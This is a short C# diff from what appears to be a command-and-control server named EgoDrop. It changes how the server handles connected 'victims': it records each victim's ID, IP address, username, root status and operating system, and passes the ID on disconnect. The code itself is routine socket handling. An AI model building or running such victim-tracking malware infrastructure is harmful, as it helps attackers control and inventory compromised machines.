@@ -106,6 +106,8 @@ namespace EgoDrop
                 return;
 
             clsVictim victim = (clsVictim)ar.AsyncState;
+            string szVictimID = string.Empty;
+
             try
             {
                 Socket skt = victim.m_sktClnt;
@@ -199,11 +201,18 @@ namespace EgoDrop
                                     }
 
                                     string szSrcVictimID = lsVictim.Last();
-
                                     fnOnReceivedMessage(victim, szSrcVictimID, lsMsg);
 
                                     if (lsMsg[0] == "info")
-                                        fnOnAddChain(lsVictim);
+                                    {
+                                        szVictimID = szSrcVictimID;
+                                        string szIPv4 = lsMsg[3];
+                                        string szUsername = lsMsg[5];
+                                        bool bRoot = string.Equals(lsMsg[7], "1");
+                                        string szOS = lsMsg[8];
+
+                                        fnOnAddChain(lsVictim, szOS, szUsername, bRoot,szIPv4);
+                                    }
                                 }
                             }
                         }
@@ -211,7 +220,7 @@ namespace EgoDrop
                 }
                 while (nRecvLength > 0);
 
-                fnOnVictimDisconnected(victim);
+                fnOnVictimDisconnected(victim, szVictimID);
             }
             catch (Exception ex)
             {
